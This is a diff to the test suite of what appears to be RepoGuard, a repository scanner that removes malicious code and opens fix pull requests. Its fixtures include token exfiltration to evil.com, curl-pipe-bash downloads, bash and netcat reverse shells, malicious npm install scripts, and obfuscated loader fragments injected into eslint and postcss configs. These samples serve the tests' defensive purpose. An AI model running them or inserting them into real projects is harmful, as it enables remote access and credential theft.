@@ -18,7 +18,9 @@ interface MockOctokit {
 
 jest.mock("prettier", () => ({
   getFileInfo: jest.fn().mockResolvedValue({ inferredParser: null }),
-  format: jest.fn().mockImplementation((content: string) => Promise.resolve(content)),
+  format: jest
+    .fn()
+    .mockImplementation((content: string) => Promise.resolve(content)),
 }));
 
 describe("pullRequest", () => {
@@ -33,14 +35,19 @@ describe("pullRequest", () => {
           file: "test.sh",
         },
       ];
-      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.sh");
+      const { patchedContent, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        "test.sh",
+      );
       expect(patchedContent).toContain("# REMOVED BY REPOGUARD: curl|bash");
       expect(patchedFindings).toHaveLength(1);
       expect(patchedFindings[0].rule).toBe("curl-pipe-bash");
     });
 
     it("does not patch env-exfiltration and returns no patched findings", async () => {
-      const original = "const token = process.env.TOKEN; axios.get('http://evil.com/?t=' + token);";
+      const original =
+        "const token = process.env.TOKEN; axios.get('http://evil.com/?t=' + token);";
       const findings: Finding[] = [
         {
           rule: "env-exfiltration",
@@ -49,13 +56,18 @@ describe("pullRequest", () => {
           file: "test.js",
         },
       ];
-      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.js");
+      const { patchedContent, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        "test.js",
+      );
       expect(patchedContent).toBe(original);
       expect(patchedFindings).toHaveLength(0);
     });
 
     it("does not auto-patch hardcoded-secret or high-entropy-secret in source code files", async () => {
-      const original = "export const AWS_SECRET = 'AKIAIOSFODNN7EXAMPLE1234567890';";
+      const original =
+        "export const AWS_SECRET = 'AKIAIOSFODNN7EXAMPLE1234567890';";
       const findings: Finding[] = [
         {
           rule: "hardcoded-secret",
@@ -72,18 +84,16 @@ describe("pullRequest", () => {
           line: 1,
         },
       ];
-      const { patchedContent, patchedFindings, shouldDelete } = await applyPatches(
-        original,
-        findings,
-        "src/config.ts",
-      );
+      const { patchedContent, patchedFindings, shouldDelete } =
+        await applyPatches(original, findings, "src/config.ts");
       expect(patchedContent).toBe(original);
       expect(patchedFindings).toHaveLength(0);
       expect(shouldDelete).toBe(false);
     });
 
     it("patches obfuscated-malware-pattern in postcss.config.mjs and comments out malware and createRequire bypasses", async () => {
-      const original = "import { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\nconst config = { plugins: ['@tailwindcss/postcss'] };\nexport default config; global.i=\"A8-2728\";global.r=require;const http=require('\\u0068\\u0074\\u0074\\u0070');";
+      const original =
+        "import { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\nconst config = { plugins: ['@tailwindcss/postcss'] };\nexport default config; global.i=\"A8-2728\";global.r=require;const http=require('\\u0068\\u0074\\u0074\\u0070');";
       const findings: Finding[] = [
         {
           rule: "obfuscated-malware-pattern",
@@ -92,14 +102,17 @@ describe("pullRequest", () => {
           file: "postcss.config.mjs",
         },
       ];
-      const { patchedContent, patchedFindings, shouldDelete } = await applyPatches(
-        original,
-        findings,
-        "postcss.config.mjs",
+      const { patchedContent, patchedFindings, shouldDelete } =
+        await applyPatches(original, findings, "postcss.config.mjs");
+      expect(patchedContent).toContain(
+        "// REMOVED BY REPOGUARD: obfuscated malware payload",
       );
-      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: obfuscated malware payload");
-      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: createRequire import for malware");
-      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: require definition for malware");
+      expect(patchedContent).toContain(
+        "// REMOVED BY REPOGUARD: createRequire import for malware",
+      );
+      expect(patchedContent).toContain(
+        "// REMOVED BY REPOGUARD: require definition for malware",
+      );
       expect(patchedContent).not.toContain("global.i=");
       expect(patchedContent).not.toContain("global.r=");
       expect(patchedFindings).toHaveLength(1);
@@ -175,7 +188,8 @@ global.i = "malicious";
     });
 
     it("patches js-obfuscated-hex with unicode escape sequences and marks overlapping line findings as patched", async () => {
-      const original = "const http=require('\\u0068\\u0074\\u0074\\u0070\\u0073');";
+      const original =
+        "const http=require('\\u0068\\u0074\\u0074\\u0070\\u0073');";
       const findings: Finding[] = [
         {
           rule: "js-obfuscated-hex",
@@ -185,8 +199,14 @@ global.i = "malicious";
           line: 1,
         },
       ];
-      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "postcss.config.mjs");
-      expect(patchedContent).toContain("/* REMOVED BY REPOGUARD: obfuscated hex payload */");
+      const { patchedContent, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        "postcss.config.mjs",
+      );
+      expect(patchedContent).toContain(
+        "/* REMOVED BY REPOGUARD: obfuscated hex payload */",
+      );
       expect(patchedFindings).toHaveLength(1);
     });
 
@@ -210,17 +230,16 @@ global.i = "malicious";
         },
       ];
 
-      const { patchedContent, patchedFindings, shouldDelete } = await applyPatches(
-        original,
-        findings,
-        "template/base/js/init",
-      );
+      const { patchedContent, patchedFindings, shouldDelete } =
+        await applyPatches(original, findings, "template/base/js/init");
 
       expect(shouldDelete).toBe(false);
       expect(patchedFindings).toHaveLength(1);
       expect(patchedContent).toContain("export function initTemplate");
       expect(patchedContent).toContain("return state;");
-      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: obfuscated malware payload");
+      expect(patchedContent).toContain(
+        "// REMOVED BY REPOGUARD: obfuscated malware payload",
+      );
       expect(patchedContent).not.toContain("function spin");
       expect(patchedContent).not.toContain("init(); var z=");
     });
@@ -247,30 +266,76 @@ global.i = "malicious";
         },
       ];
 
-      const { patchedContent, patchedFindings, shouldDelete } = await applyPatches(
-        original,
-        findings,
-        "template/base/js/eslint.config.js",
-      );
+      const { patchedContent, patchedFindings, shouldDelete } =
+        await applyPatches(
+          original,
+          findings,
+          "template/base/js/eslint.config.js",
+        );
 
       expect(shouldDelete).toBe(false);
       expect(patchedFindings).toHaveLength(1);
       // Valid eslint config is intact
       expect(patchedContent).toContain("module.exports = [");
-      expect(patchedContent).toContain("@typescript-eslint/explicit-module-boundary-types");
+      expect(patchedContent).toContain(
+        "@typescript-eslint/explicit-module-boundary-types",
+      );
       // The entire malicious line is replaced with a single clean comment
-      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: obfuscated malware payload");
+      expect(patchedContent).toContain(
+        "// REMOVED BY REPOGUARD: obfuscated malware payload",
+      );
       // None of the malicious scaffolding or decoders remain
       expect(patchedContent).not.toContain("function spin");
       expect(patchedContent).not.toContain("function splitLane");
       expect(patchedContent).not.toContain("function peel");
       expect(patchedContent).not.toContain("var z = '-2728-1'");
-      expect(patchedContent).not.toContain("/* REMOVED BY REPOGUARD: obfuscated hex payload */");
+      expect(patchedContent).not.toContain(
+        "/* REMOVED BY REPOGUARD: obfuscated hex payload */",
+      );
+    });
+
+    it("preserves closing '];' when malware payload is injected on the exact same line in eslint.config.js", async () => {
+      const original = [
+        "module.exports = [",
+        "  {",
+        "    rules: {",
+        "      '@typescript-eslint/explicit-module-boundary-types': 'off',",
+        "    },",
+        "  },",
+        "  ];var z = '-2728-1';var NX=[6912847,907388^907539,217597^204358],SX=[5283741,416048^416193];function spin(R,c){for(var e,r,t,s,i,n,a=[],o=217956^217956,l=c[648486^648486];o<R['\\u006C\\u0065\\u006E\\u0067\\u0074\\u0068'];)a[o]=R['\\u0063\\u0068\\u0061\\u0072\\u0041\\u0074'](o),o+=908966^908967;return a['\\u006A\\u006F\\u0069\\u006E']('');}function splitLane(R){var c=String['\\u0066\\u0072\\u006F\\u006D\\u0043\\u0068\\u0061\\u0072\\u0043\\u006F\\u0064\\u0065'](742867^742863),e=spin(R,NX);return e;}function peel(R){return spin(R,SX);}!function(R,c,_0x4d43e){typeof module===[818819^818818]&&(R['test']=module);var r=peel('cnotsnturtpicok'.split('').reverse().join(''));}();",
+      ].join("\n");
+
+      const findings: Finding[] = [
+        {
+          rule: "js-obfuscated-hex",
+          severity: "critical",
+          message: "hex/unicode obfuscation",
+          file: "template/base/js/eslint.config.js",
+          line: 7,
+        },
+      ];
+
+      const { patchedContent, patchedFindings, shouldDelete } =
+        await applyPatches(
+          original,
+          findings,
+          "template/base/js/eslint.config.js",
+        );
+
+      expect(shouldDelete).toBe(false);
+      expect(patchedFindings).toHaveLength(1);
+      // The closing array bracket MUST be preserved to prevent syntax error
+      expect(patchedContent).toContain("];");
+      expect(patchedContent).toContain(
+        "// REMOVED BY REPOGUARD: obfuscated malware payload",
+      );
+      expect(patchedContent).not.toContain("function spin");
+      expect(patchedContent).not.toContain("var z = '-2728-1'");
     });
 
     it("flags standalone malware file like api.js with createRequire and obfuscated decoder for deletion", async () => {
       const malware = [
-        'import {createRequire} from "module";const require=createRequire(import.meta.url);function y7(R,c,e,r,t,i,s,_0xdf6cg){for(var n=[],o=274987^274987;o<R[\'\\u006C\\u0065\\u006E\\u0067\\u0074\\u0068\'];)n[o]=R[\'\\u0065\\u0068\\u0061\\u0072\\u0041\\u0074\'](o),o+=682159^682158;return n[\'\\u006A\\u006F\\u0069\\u006E\']("");}',
+        "import {createRequire} from \"module\";const require=createRequire(import.meta.url);function y7(R,c,e,r,t,i,s,_0xdf6cg){for(var n=[],o=274987^274987;o<R['\\u006C\\u0065\\u006E\\u0067\\u0074\\u0068'];)n[o]=R['\\u0065\\u0068\\u0061\\u0072\\u0041\\u0074'](o),o+=682159^682158;return n['\\u006A\\u006F\\u0069\\u006E'](\"\");}",
         'global["\\u0021"]="w0038\\u002D\\u0041";',
         'var p8=y7("mor|bct]e".split("").reverse().join(""),6182039);',
       ].join("\n");
@@ -296,7 +361,8 @@ global.i = "malicious";
     });
 
     it("patches js-obfuscated-charcode and js-obfuscated-constructors", async () => {
-      const original = "const code = String.fromCharCode(97, 98, 99); const f = []['filter']['constructor'];";
+      const original =
+        "const code = String.fromCharCode(97, 98, 99); const f = []['filter']['constructor'];";
       const findings: Finding[] = [
         {
           rule: "js-obfuscated-charcode",
@@ -311,14 +377,23 @@ global.i = "malicious";
           file: "postcss.config.mjs",
         },
       ];
-      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "postcss.config.mjs");
-      expect(patchedContent).toContain("/* REMOVED BY REPOGUARD: obfuscated charCode payload */");
-      expect(patchedContent).toContain("/* REMOVED BY REPOGUARD: obfuscated constructor payload */");
+      const { patchedContent, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        "postcss.config.mjs",
+      );
+      expect(patchedContent).toContain(
+        "/* REMOVED BY REPOGUARD: obfuscated charCode payload */",
+      );
+      expect(patchedContent).toContain(
+        "/* REMOVED BY REPOGUARD: obfuscated constructor payload */",
+      );
       expect(patchedFindings).toHaveLength(2);
     });
 
     it("patches reverse-shell", async () => {
-      const original = "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\nnc -e /bin/sh 1.1.1.1 4444";
+      const original =
+        "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\nnc -e /bin/sh 1.1.1.1 4444";
       const findings: Finding[] = [
         {
           rule: "reverse-shell",
@@ -327,14 +402,21 @@ global.i = "malicious";
           file: "test.sh",
         },
       ];
-      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.sh");
+      const { patchedContent, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        "test.sh",
+      );
       expect(patchedContent).toContain("# REMOVED BY REPOGUARD: reverse shell");
-      expect(patchedContent).toContain("# REMOVED BY REPOGUARD: netcat reverse shell");
+      expect(patchedContent).toContain(
+        "# REMOVED BY REPOGUARD: netcat reverse shell",
+      );
       expect(patchedFindings).toHaveLength(1);
     });
 
     it("patches obfuscated-base64", async () => {
-      const original = "eval(String.fromCharCode(97, 98, 99))\neval(Buffer.from('abc').toString())";
+      const original =
+        "eval(String.fromCharCode(97, 98, 99))\neval(Buffer.from('abc').toString())";
       const findings: Finding[] = [
         {
           rule: "obfuscated-base64",
@@ -343,16 +425,28 @@ global.i = "malicious";
           file: "test.js",
         },
       ];
-      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.js");
-      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: obfuscated eval");
-      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: base64 obfuscated payload");
+      const { patchedContent, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        "test.js",
+      );
+      expect(patchedContent).toContain(
+        "// REMOVED BY REPOGUARD: obfuscated eval",
+      );
+      expect(patchedContent).toContain(
+        "// REMOVED BY REPOGUARD: base64 obfuscated payload",
+      );
       expect(patchedFindings).toHaveLength(1);
     });
 
     it("patches suspicious-npm-postinstall in package.json and handles JSON parsing error", async () => {
-      const validJson = JSON.stringify({ scripts: { postinstall: "curl | sh" } }, null, 2);
+      const validJson = JSON.stringify(
+        { scripts: { postinstall: "curl | sh" } },
+        null,
+        2,
+      );
       const invalidJson = "{ scripts: { postinstall: 'curl | sh' }";
-      
+
       const findings: Finding[] = [
         {
           rule: "suspicious-npm-postinstall",
@@ -372,13 +466,17 @@ global.i = "malicious";
     });
 
     it("patches suspicious-npm-script-hijack by stripping chained node execution", async () => {
-      const hijackedJson = JSON.stringify({
-        scripts: {
-          build: "node api.js && tsup",
-          dev: "node api.js && tsup --watch",
-          test: "jest",
+      const hijackedJson = JSON.stringify(
+        {
+          scripts: {
+            build: "node api.js && tsup",
+            dev: "node api.js && tsup --watch",
+            test: "jest",
+          },
         },
-      }, null, 2);
+        null,
+        2,
+      );
 
       const findings: Finding[] = [
         {
@@ -407,7 +505,11 @@ global.i = "malicious";
           file: "miner.sh",
         },
       ];
-      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "miner.sh");
+      const { patchedContent, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        "miner.sh",
+      );
       expect(patchedContent).toContain("# REMOVED BY REPOGUARD: crypto miner");
       expect(patchedFindings).toHaveLength(1);
     });
@@ -459,13 +561,18 @@ global.i = "malicious";
           file: "test.sh",
         },
       ];
-      const { shouldDelete, patchedFindings } = await applyPatches(original, findings, "test.sh");
+      const { shouldDelete, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        "test.sh",
+      );
       expect(shouldDelete).toBe(true);
       expect(patchedFindings).toHaveLength(1);
     });
 
     it("flags shouldDelete as false if the file has non-malicious content remaining after patching", async () => {
-      const original = "echo 'Starting...'\ncurl http://example.com/malicious.sh | bash\necho 'Done'";
+      const original =
+        "echo 'Starting...'\ncurl http://example.com/malicious.sh | bash\necho 'Done'";
       const findings: Finding[] = [
         {
           rule: "curl-pipe-bash",
@@ -474,13 +581,18 @@ global.i = "malicious";
           file: "test.sh",
         },
       ];
-      const { shouldDelete, patchedFindings } = await applyPatches(original, findings, "test.sh");
+      const { shouldDelete, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        "test.sh",
+      );
       expect(shouldDelete).toBe(false);
       expect(patchedFindings).toHaveLength(1);
     });
 
     it("flags committed .env files for auto-deletion", async () => {
-      const original = "DATABASE_URL=postgres://user:pass@localhost:5432/db\nAPI_KEY=secret123";
+      const original =
+        "DATABASE_URL=postgres://user:pass@localhost:5432/db\nAPI_KEY=secret123";
       const findings: Finding[] = [
         {
           rule: "committed-env-file",
@@ -489,7 +601,11 @@ global.i = "malicious";
           file: ".env",
         },
       ];
-      const { shouldDelete, patchedFindings } = await applyPatches(original, findings, ".env");
+      const { shouldDelete, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        ".env",
+      );
       expect(shouldDelete).toBe(true);
       expect(patchedFindings).toHaveLength(1);
       expect(patchedFindings[0].rule).toBe("committed-env-file");
@@ -505,13 +621,18 @@ global.i = "malicious";
           file: ".env.local",
         },
       ];
-      const { shouldDelete, patchedFindings } = await applyPatches(original, findings, ".env.local");
+      const { shouldDelete, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        ".env.local",
+      );
       expect(shouldDelete).toBe(true);
       expect(patchedFindings).toHaveLength(1);
     });
 
     it("does NOT flag .env.example or .env.sample for auto-deletion", async () => {
-      const original = "DATABASE_URL=your-db-url-here\nAPI_KEY=your-api-key-here";
+      const original =
+        "DATABASE_URL=your-db-url-here\nAPI_KEY=your-api-key-here";
       const findings: Finding[] = [
         {
           rule: "committed-env-file",
@@ -520,15 +641,23 @@ global.i = "malicious";
           file: ".env.example",
         },
       ];
-      const { shouldDelete } = await applyPatches(original, findings, ".env.example");
+      const { shouldDelete } = await applyPatches(
+        original,
+        findings,
+        ".env.example",
+      );
       expect(shouldDelete).toBe(false);
     });
 
     it("replaces typosquatted npm package with legitimate counterpart in package.json", async () => {
-      const original = JSON.stringify({
-        name: "my-app",
-        dependencies: { axois: "^1.0.0", lodash: "^4.0.0" },
-      }, null, 2);
+      const original = JSON.stringify(
+        {
+          name: "my-app",
+          dependencies: { axois: "^1.0.0", lodash: "^4.0.0" },
+        },
+        null,
+        2,
+      );
       const findings: Finding[] = [
         {
           rule: "npm-typosquatted-package",
@@ -537,8 +666,14 @@ global.i = "malicious";
           file: "package.json",
         },
       ];
-      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "package.json");
-      const parsed = JSON.parse(patchedContent) as { dependencies: Record<string, string> };
+      const { patchedContent, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        "package.json",
+      );
+      const parsed = JSON.parse(patchedContent) as {
+        dependencies: Record<string, string>;
+      };
       expect(parsed.dependencies["axois"]).toBeUndefined();
       expect(parsed.dependencies["axios"]).toBe("^1.0.0");
       expect(parsed.dependencies["lodash"]).toBe("^4.0.0");
@@ -555,7 +690,11 @@ global.i = "malicious";
           file: "requirements.txt",
         },
       ];
-      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "requirements.txt");
+      const { patchedContent, patchedFindings } = await applyPatches(
+        original,
+        findings,
+        "requirements.txt",
+      );
       expect(patchedContent).toContain("requests==2.28.0");
       expect(patchedContent).not.toContain("reqeusts");
       expect(patchedContent).toContain("pandas==1.5.0");
@@ -576,7 +715,9 @@ global.i = "malicious";
       const mockOctokit = {
         request: jest.fn().mockImplementation((endpoint: string) => {
           if (endpoint.includes("/commits/")) {
-            return Promise.resolve({ data: { sha: "e1b701e65c52c6f1122a07c336ef1cfd21c322b6" } });
+            return Promise.resolve({
+              data: { sha: "e1b701e65c52c6f1122a07c336ef1cfd21c322b6" },
+            });
           }
           return Promise.resolve({ data: {} });
         }),
@@ -587,7 +728,9 @@ global.i = "malicious";
         ".github/workflows/deploy.yml",
         mockOctokit as any,
       );
-      expect(patchedContent).toContain("uses: docker/build-push-action@e1b701e65c52c6f1122a07c336ef1cfd21c322b6 # v3");
+      expect(patchedContent).toContain(
+        "uses: docker/build-push-action@e1b701e65c52c6f1122a07c336ef1cfd21c322b6 # v3",
+      );
       expect(patchedFindings).toHaveLength(1);
     });
 
@@ -606,7 +749,9 @@ global.i = "malicious";
         findings,
         ".github/workflows/ci.yml",
       );
-      expect(patchedContent).toContain("uses: third-party/some-action@v1.2 # REPOGUARD: PIN TO COMMIT SHA");
+      expect(patchedContent).toContain(
+        "uses: third-party/some-action@v1.2 # REPOGUARD: PIN TO COMMIT SHA",
+      );
       expect(patchedFindings).toHaveLength(1);
     });
 
@@ -728,7 +873,8 @@ global.i = "malicious";
       const generateAIPatchSpy = jest.spyOn(aiService, "generateAIPatch");
 
       try {
-        const original = "FROM node:20\nRUN curl https://evil.com/x.sh | bash\n";
+        const original =
+          "FROM node:20\nRUN curl https://evil.com/x.sh | bash\n";
         const findings: Finding[] = [
           {
             rule: "docker-curl-pipe-bash",
@@ -745,8 +891,12 @@ global.i = "malicious";
 
         expect(generateAIPatchSpy).not.toHaveBeenCalled();
         expect(patchedFindings).toHaveLength(1);
-        expect(patchedContent).toContain("# REMOVED BY REPOGUARD: curl|bash remote execution");
-        expect(patchedContent).not.toContain("curl https://evil.com/x.sh | bash");
+        expect(patchedContent).toContain(
+          "# REMOVED BY REPOGUARD: curl|bash remote execution",
+        );
+        expect(patchedContent).not.toContain(
+          "curl https://evil.com/x.sh | bash",
+        );
       } finally {
         generateAIPatchSpy.mockRestore();
         if (originalEnv !== undefined) {
@@ -804,7 +954,9 @@ global.i = "malicious";
 
         // Verify that deterministic rule curl-pipe-bash was NOT sent to AI as an issue to fix
         const calledFindings = generateAIPatchSpy.mock.calls[0][2];
-        expect(calledFindings.some((f) => f.rule === "curl-pipe-bash")).toBe(false);
+        expect(calledFindings.some((f) => f.rule === "curl-pipe-bash")).toBe(
+          false,
+        );
 
         // Both findings are marked patched and both fixes are retained
         expect(patchedFindings).toHaveLength(2);
@@ -844,11 +996,17 @@ global.i = "malicious";
 
       expect(body).toContain("## 🔒 RepoGuard Security Report");
       expect(body).toContain("* **Resolved (Patched):** 1 finding");
-      expect(body).toContain("* **Remaining (Requires Manual Review):** 1 finding");
+      expect(body).toContain(
+        "* **Remaining (Requires Manual Review):** 1 finding",
+      );
       expect(body).toContain("✅ Patched");
       expect(body).toContain("⚠️ Requires Manual Review");
-      expect(body).toContain("Malicious shell execution patterns (`curl|bash`) replaced with comments");
-      expect(body).toContain("**Env exfiltration** — audit any network calls that reference env variables");
+      expect(body).toContain(
+        "Malicious shell execution patterns (`curl|bash`) replaced with comments",
+      );
+      expect(body).toContain(
+        "**Env exfiltration** — audit any network calls that reference env variables",
+      );
     });
 
     it("includes deleted files in the summary and status table", () => {
@@ -862,10 +1020,14 @@ global.i = "malicious";
       ];
       const patchedFindings = [findings[0]];
       const unpatchedFindings: Finding[] = [];
-      const body = buildPRBody(findings, patchedFindings, unpatchedFindings, ["deleted-file.sh"]);
+      const body = buildPRBody(findings, patchedFindings, unpatchedFindings, [
+        "deleted-file.sh",
+      ]);
 
       expect(body).toContain("🗑️ Deleted");
-      expect(body).toContain("Fully-malicious files deleted: `deleted-file.sh`");
+      expect(body).toContain(
+        "Fully-malicious files deleted: `deleted-file.sh`",
+      );
     });
   });
 
@@ -886,7 +1048,9 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("const token = process.env.TOKEN; axios.get('http://evil.com/?t=' + token);").toString("base64"),
+              content: Buffer.from(
+                "const token = process.env.TOKEN; axios.get('http://evil.com/?t=' + token);",
+              ).toString("base64"),
               sha: "file-sha-123",
             },
           };
@@ -915,16 +1079,24 @@ global.i = "malicious";
       });
 
       // Verify it fetched the file content
-      expect(requestMock).toHaveBeenCalledWith("GET /repos/{owner}/{repo}/contents/{path}", {
-        owner: "test-owner",
-        repo: "test-repo",
-        path: "test.js",
-      });
+      expect(requestMock).toHaveBeenCalledWith(
+        "GET /repos/{owner}/{repo}/contents/{path}",
+        {
+          owner: "test-owner",
+          repo: "test-repo",
+          path: "test.js",
+        },
+      );
 
       // Verify it posted an issue instead of creating refs or PRs
-      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/issues", expect.objectContaining({
-        title: expect.stringContaining("Security findings requiring manual review"),
-      }));
+      expect(requestMock).toHaveBeenCalledWith(
+        "POST /repos/{owner}/{repo}/issues",
+        expect.objectContaining({
+          title: expect.stringContaining(
+            "Security findings requiring manual review",
+          ),
+        }),
+      );
 
       // Ensure no branch creation or PR was requested
       const routesCalled = requestMock.mock.calls.map((c) => c[0]);
@@ -938,7 +1110,9 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("const someCode = 1;\ncurl http://evil.com/x.sh | bash").toString("base64"),
+              content: Buffer.from(
+                "const someCode = 1;\ncurl http://evil.com/x.sh | bash",
+              ).toString("base64"),
               sha: "file-sha-123",
             },
           };
@@ -990,7 +1164,9 @@ global.i = "malicious";
 
       const routesCalled = requestMock.mock.calls.map((c) => c[0]);
       expect(routesCalled).toContain("POST /repos/{owner}/{repo}/git/refs");
-      expect(routesCalled).toContain("PUT /repos/{owner}/{repo}/contents/{path}");
+      expect(routesCalled).toContain(
+        "PUT /repos/{owner}/{repo}/contents/{path}",
+      );
       expect(routesCalled).toContain("POST /repos/{owner}/{repo}/pulls");
       expect(routesCalled).not.toContain("POST /repos/{owner}/{repo}/issues");
     });
@@ -1001,7 +1177,9 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
+              content: Buffer.from("curl http://evil.com/x.sh | bash").toString(
+                "base64",
+              ),
               sha: "file-sha-123",
             },
           };
@@ -1047,8 +1225,12 @@ global.i = "malicious";
 
       const routesCalled = requestMock.mock.calls.map((c) => c[0]);
       expect(routesCalled).toContain("POST /repos/{owner}/{repo}/git/refs");
-      expect(routesCalled).toContain("DELETE /repos/{owner}/{repo}/contents/{path}");
-      expect(routesCalled).not.toContain("PUT /repos/{owner}/{repo}/contents/{path}");
+      expect(routesCalled).toContain(
+        "DELETE /repos/{owner}/{repo}/contents/{path}",
+      );
+      expect(routesCalled).not.toContain(
+        "PUT /repos/{owner}/{repo}/contents/{path}",
+      );
       expect(routesCalled).toContain("POST /repos/{owner}/{repo}/pulls");
     });
 
@@ -1105,8 +1287,12 @@ global.i = "malicious";
       });
 
       const routesCalled = requestMock.mock.calls.map((c) => c[0]);
-      expect(routesCalled).toContain("DELETE /repos/{owner}/{repo}/contents/{path}");
-      expect(routesCalled).not.toContain("PUT /repos/{owner}/{repo}/contents/{path}");
+      expect(routesCalled).toContain(
+        "DELETE /repos/{owner}/{repo}/contents/{path}",
+      );
+      expect(routesCalled).not.toContain(
+        "PUT /repos/{owner}/{repo}/contents/{path}",
+      );
     });
 
     it("falls back to security issue if git branch creation fails due to permission error", async () => {
@@ -1115,7 +1301,9 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("const someCode = 1;\ncurl http://evil.com/x.sh | bash").toString("base64"),
+              content: Buffer.from(
+                "const someCode = 1;\ncurl http://evil.com/x.sh | bash",
+              ).toString("base64"),
               sha: "file-sha-123",
             },
           };
@@ -1150,9 +1338,14 @@ global.i = "malicious";
         findings,
       });
 
-      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/issues", expect.objectContaining({
-        title: expect.stringContaining("Security issues found — manual review required"),
-      }));
+      expect(requestMock).toHaveBeenCalledWith(
+        "POST /repos/{owner}/{repo}/issues",
+        expect.objectContaining({
+          title: expect.stringContaining(
+            "Security issues found — manual review required",
+          ),
+        }),
+      );
     });
 
     it("throws error if git branch creation fails due to a generic error", async () => {
@@ -1161,7 +1354,9 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("const someCode = 1;\ncurl http://evil.com/x.sh | bash").toString("base64"),
+              content: Buffer.from(
+                "const someCode = 1;\ncurl http://evil.com/x.sh | bash",
+              ).toString("base64"),
               sha: "file-sha-123",
             },
           };
@@ -1187,11 +1382,13 @@ global.i = "malicious";
         },
       ];
 
-      await expect(openFixPR(mockOctokit, {
-        owner: "test-owner",
-        repo: "test-repo",
-        findings,
-      })).rejects.toThrow("Something went wrong");
+      await expect(
+        openFixPR(mockOctokit, {
+          owner: "test-owner",
+          repo: "test-repo",
+          findings,
+        }),
+      ).rejects.toThrow("Something went wrong");
     });
 
     it("handles file fetching exceptions inside the loop", async () => {
@@ -1220,16 +1417,17 @@ global.i = "malicious";
         findings,
       });
 
-      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/issues", expect.any(Object));
+      expect(requestMock).toHaveBeenCalledWith(
+        "POST /repos/{owner}/{repo}/issues",
+        expect.any(Object),
+      );
     });
 
     it("skips non-file data in openFixPR", async () => {
       requestMock.mockImplementation((route: string) => {
         if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
           return {
-            data: [
-              { name: "subfile.sh", type: "file" }
-            ],
+            data: [{ name: "subfile.sh", type: "file" }],
           };
         }
         if (route === "POST /repos/{owner}/{repo}/issues") {
@@ -1253,7 +1451,10 @@ global.i = "malicious";
         findings,
       });
 
-      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/issues", expect.any(Object));
+      expect(requestMock).toHaveBeenCalledWith(
+        "POST /repos/{owner}/{repo}/issues",
+        expect.any(Object),
+      );
     });
 
     it("handles request reviewers and existing labels when opening PR", async () => {
@@ -1262,7 +1463,9 @@ global.i = "malicious";
           return {
             data: {
               type: "file",
-              content: Buffer.from("const someCode = 1;\ncurl http://evil.com/x.sh | bash").toString("base64"),
+              content: Buffer.from(
+                "const someCode = 1;\ncurl http://evil.com/x.sh | bash",
+              ).toString("base64"),
               sha: "file-sha-123",
             },
           };
@@ -1292,11 +1495,14 @@ global.i = "malicious";
           return {
             data: [
               { login: "admin-user", permissions: { admin: true } },
-              { login: "regular-user", permissions: { admin: false } }
-            ]
+              { login: "regular-user", permissions: { admin: false } },
+            ],
           };
         }
-        if (route === "POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers") {
+        if (
+          route ===
+          "POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers"
+        ) {
           return { data: {} };
         }
         if (route === "GET /repos/{owner}/{repo}/labels") {
@@ -1305,7 +1511,7 @@ global.i = "malicious";
               { name: "repoguard", color: "2080e8" },
               { name: "security", color: "b60205" },
               { name: "automated-fix", color: "0075ca" },
-            ]
+            ],
           };
         }
         if (route === "PATCH /repos/{owner}/{repo}/labels/{name}") {
@@ -1314,7 +1520,9 @@ global.i = "malicious";
         if (route === "POST /repos/{owner}/{repo}/labels") {
           return { data: {} };
         }
-        if (route === "POST /repos/{owner}/{repo}/issues/{issue_number}/labels") {
+        if (
+          route === "POST /repos/{owner}/{repo}/issues/{issue_number}/labels"
+        ) {
           return { data: {} };
         }
         throw new Error(`Unexpected request: ${route}`);
@@ -1337,12 +1545,18 @@ global.i = "malicious";
 
       expect(requestMock).toHaveBeenCalledWith(
         "POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers",
-        expect.objectContaining({ pull_number: 100, reviewers: ["admin-user"] })
+        expect.objectContaining({
+          pull_number: 100,
+          reviewers: ["admin-user"],
+        }),
       );
 
       expect(requestMock).toHaveBeenCalledWith(
